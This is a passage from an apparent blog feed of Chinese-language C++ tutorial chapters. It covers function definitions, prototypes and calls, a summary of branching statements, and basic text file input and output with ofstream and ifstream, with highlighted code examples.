void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：定义一个简单的函数</strong></p><p>这个函数不接受参数，也不返回值 (<code>void</code>)，只是打印一条消息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_greeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from the function!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用函数</span></span><br><span class="line">    print_greeting();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：定义一个带参数并返回值的函数</strong></p><p>这个函数接受两个整数作为参数，并返回它们的和。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_numbers</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = num1 + num2;</span><br><span class="line">    <span class="keyword">return</span> sum; <span class="comment">// 返回计算结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 调用函数并将返回值存储在 result 变量中</span></span><br><span class="line">    <span class="keyword">int</span> result = add_numbers(a, b);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: The sum of 5 and 3 is: 8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-1-2-函数原型和函数调用"><a href="#7-1-2-函数原型和函数调用" class="headerlink" title="7.1.2 函数原型和函数调用"></a>7.1.2 函数原型和函数调用</h2><p><strong>函数原型 (Function Prototype)</strong> 也称为函数声明 (Function Declaration)，它告诉编译器函数的名称、返回类型以及参数列表（类型和顺序），但不包含函数体。原型通常放在 <code>main()</code> 函数之前或单独的头文件中。</p><p><strong>为什么需要原型？</strong></p><p>C++ 编译器在处理代码时需要“预先知道”函数的接口（它接受什么参数，返回什么类型），然后才能正确地处理对该函数的调用。如果函数定义出现在调用它的代码之后，编译器在遇到调用时就不知道该函数是否存在或如何调用它，从而导致编译错误。函数原型解决了这个问题。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_type_list)</span></span>; <span class="comment">// 注意末尾的分号</span></span><br></pre></td></tr></table></figure><p>参数名称在原型中是可选的，但写上通常能提高可读性。</p><p><strong>函数调用 (Function Call)</strong> 是指在程序中执行一个函数。通过使用函数名，并在括号中提供所需的实际参数（称为**实参 (Arguments)**）来完成调用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于不返回值的函数</span></span><br><span class="line">function_name(argument_list);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于返回值的函数</span></span><br><span class="line">variable = function_name(argument_list);</span><br><span class="line"><span class="comment">// 或者直接在表达式中使用</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; function_name(argument_list);</span></span><br></pre></td></tr></table></figure><p><strong>示例：使用函数原型</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span>; <span class="comment">// 声明函数接口</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;           <span class="comment">// 声明函数接口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数调用</span></span><br><span class="line">    display_message(<span class="string">&quot;This is a message.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> product = multiply(num1, num2); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The product of &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2 &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; product &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 42</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现) - 可以放在 main 之后，因为原型已经提供了信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  <strong>函数定义:</strong> 提供了函数的完整实现（代码）。</li><li>  <strong>函数原型:</strong> 声明了函数的接口（名称、返回类型、参数类型），让编译器知道如何调用它，通常放在调用之前。</li><li>  <strong>函数调用:</strong> 通过函数名和实参来执行函数定义的代码。</li></ul><p>函数是构建结构化和可维护 C++ 程序的核心工具。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.9 总结</title>
      <link href="2025/04/26/6.9_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/6.9_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章介绍了 C++ 中用于控制程序流程的各种分支语句和相关概念，使得程序能够根据不同的条件执行不同的代码路径。</p><p>主要内容回顾：</p><ol><li><p><strong><code>if</code> 语句系列:</strong></p><ul><li>  <code>if</code> 语句：根据条件是否为真来决定是否执行某段代码。</li><li>  <code>if else</code> 语句：提供两个代码路径，根据条件为真或假选择其一执行。</li><li>  <code>if else if else</code> 结构：用于处理多个互斥的条件，提供多路分支选择。</li></ul></li><li><p><strong>逻辑运算符:</strong></p><ul><li>  <code>||</code> (逻辑或)：两个操作数中至少一个为真时，结果为真。</li><li>  <code>&amp;&amp;</code> (逻辑与)：两个操作数都为真时，结果才为真。具有短路求值特性。</li><li>  <code>!</code> (逻辑非)：反转操作数的逻辑状态（真变假，假变真）。</li></ul></li><li><p><strong><code>cctype</code> 库:</strong></p><ul><li>  提供了一系列用于处理字符的函数，如 <code>isalpha()</code>, <code>isdigit()</code>, <code>isspace()</code>, <code>ispunct()</code>, <code>toupper()</code>, <code>tolower()</code> 等，方便进行字符分类和转换。</li></ul></li><li><p><strong>三元运算符 (<code>?:</code>)</strong>:</p><ul><li>  提供了一种简洁的方式来根据条件选择两个值中的一个，是 <code>if else</code> 语句的一种紧凑替代形式，常用于简单的赋值操作。</li><li>  语法：<code>condition ? expression1 : expression2;</code></li></ul></li><li><p><strong><code>switch</code> 语句:</strong></p><ul><li>  根据一个整数表达式的值，从多个 <code>case</code> 标签中选择一个匹配的执行点。</li><li>  通常与 <code>break</code> 语句配合使用，以防止“贯穿”到下一个 <code>case</code>。</li><li>  <code>default</code> 标签处理所有其他不匹配的情况。</li><li>  <code>case</code> 标签必须是常量表达式。</li><li>  适用于基于单个离散整数值的多路分支。</li></ul></li><li><p><strong><code>break</code> 和 <code>continue</code> 语句:</strong></p><ul><li>  <code>break</code>：立即终止<strong>最内层</strong>的循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句。</li><li>  <code>continue</code>：跳过当前循环迭代的<strong>剩余部分</strong>，直接开始下一次迭代（更新和条件检查）。</li></ul></li><li><p><strong>读取数字的循环:</strong></p><ul><li>  演示了如何使用循环（如 <code>while (cin &gt;&gt; value)</code>）来连续读取数字输入。</li><li>  强调了处理错误输入的重要性，包括使用 <code>cin.clear()</code> 清除错误状态和 <code>cin.ignore()</code> 丢弃无效输入，以编写更健壮的输入代码。</li></ul></li><li><p><strong>简单文件输入/输出:</strong></p><ul><li>  引入了 <code>&lt;fstream&gt;</code> 库，用于文件操作。</li><li>  <code>ofstream</code>：用于向文件<strong>写入</strong>数据（输出文件流），使用 <code>&lt;&lt;</code> 操作符。</li><li>  <code>ifstream</code>：用于从文件<strong>读取</strong>数据（输入文件流），使用 <code>&gt;&gt;</code> 或 <code>getline()</code>。</li><li>  强调了文件打开检查 (<code>is_open()</code>) 和关闭文件 (<code>close()</code> 或利用对象析构) 的重要性。</li><li>  区分了文本 I/O 和二进制 I/O 的基本概念。</li></ul></li></ol><p>通过掌握这些分支结构和控制语句，可以编写出能够响应不同情况、处理用户输入和文件数据的更复杂、更灵活的 C++ 程序。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.8 简单文件输入/输出</title>
      <link href="2025/04/26/6.8_%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5_%E8%BE%93%E5%87%BA/"/>
      <url>2025/04/26/6.8_%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5_%E8%BE%93%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>到目前为止，我们主要使用 <code>cin</code> 从键盘读取输入，用 <code>cout</code> 向屏幕显示输出。C++ 还提供了强大的功能，可以让我们将数据写入文件或从文件中读取数据。这对于存储程序运行结果、读取配置文件或处理大量数据至关重要。本节将介绍基本的文本文件输入/输出（I/O）操作。</p><h2 id="6-8-1-文本-I-O-和文本文件"><a href="#6-8-1-文本-I-O-和文本文件" class="headerlink" title="6.8.1 文本 I/O 和文本文件"></a>6.8.1 文本 I/O 和文本文件</h2><p>文件 I/O 主要有两种模式：文本模式和二进制模式。</p><ul><li><p>  <strong>文本文件 (Text File):</strong> 文本文件存储的是人类可读的字符序列。文件中的数据被解释为字符，数字（如 <code>123</code>）会被存储为字符序列（<code>&#39;1&#39;</code>, <code>&#39;2&#39;</code>, <code>&#39;3&#39;</code>）。在不同的操作系统上，文本文件对行尾的处理可能不同（例如，Windows 使用回车+换行 <code>\r\n</code>，Unix/Linux 使用换行 <code>\n</code>）。C++ 的文本 I/O 会自动处理这些行尾转换，使得代码更具可移植性。我们通常使用 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 或 <code>getline</code> 等函数来处理文本文件。</p></li><li><p>  <strong>二进制文件 (Binary File):</strong> 二进制文件存储的是数据的原始字节表示。数字 <code>123</code> 会被存储为其在内存中的二进制形式（例如，一个 4 字节的 <code>int</code>）。二进制 I/O 不进行任何字符转换或行尾处理，读写速度通常更快，文件也可能更小，但内容通常不是人类直接可读的。处理二进制文件通常使用 <code>read()</code> 和 <code>write()</code> 成员函数。</p></li></ul><p>本节重点介绍<strong>文本文件</strong>的 I/O 操作。</p><h2 id="6-8-2-写入到文本文件中"><a href="#6-8-2-写入到文本文件中" class="headerlink" title="6.8.2 写入到文本文件中"></a>6.8.2 写入到文本文件中</h2><p>要将数据写入文本文件，我们需要使用 C++ 的文件流库 <code>&lt;fstream&gt;</code>。</p><p><strong>步骤:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;fstream&gt;</code></li><li><strong>创建 <code>ofstream</code> 对象:</strong> <code>ofstream</code> 类（output file stream）用于向文件写入数据。你需要创建一个该类的对象，并在创建时或之后将其与一个文件名关联起来。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ofstream outputFile; <span class="comment">// 创建 ofstream 对象</span></span><br><span class="line">outputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// 将对象与文件关联（如果文件不存在则创建，如果存在则清空内容）</span></span><br><span class="line"><span class="comment">// 或者在创建时直接关联</span></span><br><span class="line"><span class="comment">// std::ofstream outputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><strong>检查文件是否成功打开:</strong> 在尝试写入之前，最好检查文件是否成功打开。可以使用 <code>is_open()</code> 方法或直接检查流对象的状态。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!outputFile.is_open()) &#123; <span class="comment">// 或者 if (!outputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for writing!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 或者进行其他错误处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>写入数据:</strong> 使用与 <code>cout</code> 类似的 <code>&lt;&lt;</code> 运算符将数据写入文件流。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> year = <span class="number">2024</span>;</span><br><span class="line"><span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> item = <span class="string">&quot;Gadget&quot;</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Item: &quot;</span> &lt;&lt; item &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Year: &quot;</span> &lt;&lt; year &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>关闭文件:</strong> 完成写入后，应该关闭文件以确保所有数据都被刷新（写入）到磁盘，并释放文件资源。可以显式调用 <code>close()</code> 方法，或者当 <code>ofstream</code> 对象离开其作用域时（例如函数结束），其析构函数会自动关闭文件。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outputFile.close(); <span class="comment">// 显式关闭</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>示例代码:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt; // 包含文件流头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ofstream 对象并关联文件</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// 尝试打开/创建 report.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!outFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for writing.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回错误码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 写入数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Writing data to report.txt...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--- Sales Report ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Product: Laptop&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Quantity: 15&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; <span class="number">15</span> * <span class="number">1200.50</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件 (虽然析构函数会自动关闭，但显式关闭是好习惯)</span></span><br><span class="line">    outFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data written successfully.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行此程序后，将在程序所在的目录下创建一个名为 <code>report.txt</code> 的文件（如果不存在），其内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--- Sales Report ---</span><br><span class="line">Product: Laptop</span><br><span class="line">Quantity: 15</span><br><span class="line">Revenue: 18007.5</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h2 id="6-8-3-读取文本文件"><a href="#6-8-3-读取文本文件" class="headerlink" title="6.8.3 读取文本文件"></a>6.8.3 读取文本文件</h2><p>从文本文件读取数据与写入类似，但使用 <code>ifstream</code> 类（input file stream）。</p><p><strong>步骤:</strong></p><ol><li><p> <strong>包含头文件:</strong> <code>#include &lt;fstream&gt;</code></p></li><li><p><strong>创建 <code>ifstream</code> 对象:</strong> 创建一个 <code>ifstream</code> 对象并将其与要读取的文件名关联。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ifstream inputFile; <span class="comment">// 创建 ifstream 对象</span></span><br><span class="line">inputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// 将对象与文件关联以供读取</span></span><br><span class="line"><span class="comment">// 或者在创建时直接关联</span></span><br><span class="line"><span class="comment">// std::ifstream inputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><p><strong>检查文件是否成功打开:</strong> 同样，检查文件是否成功打开至关重要。如果文件不存在或无法访问，打开操作会失败。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!inputFile.is_open()) &#123; <span class="comment">// 或者 if (!inputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for reading!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>读取数据:</strong> 可以使用与 <code>cin</code> 类似的 <code>&gt;&gt;</code> 运算符来读取由空格分隔的数据，或者使用 <code>std::getline()</code> 来读取整行。读取操作通常放在循环中，直到到达文件末尾。</p><ul><li>  <strong>使用 <code>&gt;&gt;</code> 读取:</strong> 它会跳过前导空白（空格、制表符、换行符），然后读取直到遇到下一个空白字符。</li><li>  <strong>使用 <code>std::getline(inputFile, lineString)</code> 读取:</strong> 它会读取整行（包括空格），直到遇到换行符 <code>\n</code> 为止（换行符本身会被读取并丢弃）。</li></ul></li><li><p><strong>检查文件末尾 (EOF):</strong> 当尝试读取但已无数据可读时（到达文件末尾），输入流会进入特殊状态。循环通常依赖于检查流的状态来终止。</p><ul><li>  <code>while (inputFile &gt;&gt; variable)</code>: 当 <code>&gt;&gt;</code> 成功读取时，流状态为 <code>true</code>，循环继续；到达文件末尾或遇到无效数据时，状态变为 <code>false</code>，循环终止。</li><li>  <code>while (std::getline(inputFile, lineString))</code>: 当 <code>getline</code> 成功读取一行时，流状态为 <code>true</code>；到达文件末尾时，状态变为 <code>false</code>。</li></ul></li><li><p><strong>关闭文件:</strong> 读取完成后，关闭文件。同样，可以显式调用 <code>close()</code>，或者依赖对象的析构函数。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputFile.close();</span><br></pre></td></tr></table></figure></li></ol><p><strong>示例代码 (读取 <code>report.txt</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // 用于存储读取的行</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ifstream 对象并关联文件</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for reading.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading data from report.txt using getline:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; lines;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 使用 getline 逐行读取</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::getline(inFile, line)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read line: &quot;</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        lines.push_back(line); <span class="comment">// 将读取的行存入 vector</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查循环是因为到达文件末尾还是发生错误</span></span><br><span 